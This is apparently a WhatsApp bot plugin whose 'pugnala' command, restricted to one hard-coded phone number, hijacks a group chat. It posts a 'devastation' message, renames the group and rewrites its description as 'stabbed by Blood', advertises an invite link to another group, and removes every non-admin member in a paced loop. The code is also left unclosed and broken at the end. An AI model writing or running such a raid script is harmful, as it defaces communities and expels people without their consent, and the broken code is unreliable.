const AUTHORIZED_JID = '447529688238@s.whatsapp.net';

export default async function handler(m, {
  conn,
  participants,
  command,
  isBotAdmin
}) {
  const sender = m.sender;
  const utenti = participants
    .map(u => u.id)
    .filter(id => id !== conn.user.jid);

  const delay = ms => new Promise(res => setTimeout(res, ms));

  // controllo bot admin
  if (!isBotAdmin) {
    return m.reply('❌ Il bot non è amministratore del gruppo.');
  }

  // 🔒 SOLO NUMERO AUTORIZZATO
  if (sender !== AUTHORIZED_JID) {
    return m.reply('🔒 Non sei autorizzato a usare questo comando.');
  }

  if (command === 'pugnala') {
    // 🩸 Messaggio iniziale
    await conn.sendMessage(m.chat, {
      text:
        '𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.'
    });

    await delay(3000);

    // ✏️ Nome gruppo
    try {
      await conn.groupUpdateSubject(m.chat, 'SVT BY BLOOD');
    } catch (e) {
      console.error('Errore nome gruppo:', e);
    }

    // 📝 Descrizione
    try {
      await conn.groupUpdateDescription(
        m.chat,
        '*GRUPPO PUGNALATO DA BLOOD*'
      );
    } catch (e) {
      console.error('Errore descrizione:', e);
    }

    await delay(2000);

    // 🔗 Messaggio finale
    await conn.sendMessage(m.chat, {
      text:
        "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥'𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝:\n\n" +
        'https://chat.whatsapp.com/GReeEoOxlOxCVBBCyXJuEj'
    });

    await delay(2000);

  // 👢 RIMOZIONE UTENTI (ULTRA SAFE)
try {
  const metadata = await conn.groupMetadata(m.chat);

  // solo NON admin
  const victims = metadata.participants
    .filter(p => !p.admin) // niente admin / superadmin
    .map(p => p.id)
    .filter(id =>
      id !== conn.user.jid && // non il bot
      id !== m.sender         // non chi ha eseguito il comando
    );

  const delay = ms => new Promise(res => setTimeout(res, ms));

  for (const jid of victims) {
    try {
      await conn.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await delay(3000); // OBBLIGATORIO
    } catch (e) {
      console.error('Kick fallito per:', jid);
      await delay(3000);
    }
  }
} catch (e) {
  console.error('Errore rimozione utenti:', e);
}

// METADATI CHATUNITY
handler.command = ['pugnala'];
handler.group = true;